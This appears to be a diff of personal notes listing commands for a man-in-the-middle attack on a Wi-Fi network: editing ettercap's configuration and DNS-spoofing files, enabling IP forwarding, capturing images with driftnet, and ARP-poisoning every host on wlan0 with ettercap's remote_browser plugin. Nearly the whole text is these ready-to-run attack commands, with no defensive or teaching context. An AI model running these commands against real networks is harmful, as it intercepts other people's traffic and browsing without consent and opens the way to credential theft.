@@ -1,2 +1,13 @@
 nano /etc/ettercap/etter.conf 
 nano /etc/ettercap/etter.dns
+
+==========================
+driftnet -i wlan0
+
+ettercap -T -q -M arp:remote -P remote_browser -i wlan0 ///                                                          
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+or 
+ettercap-grafc           >>> ettercap -T -q -M arp:remote -P remote_browser -i wlan0 ///     
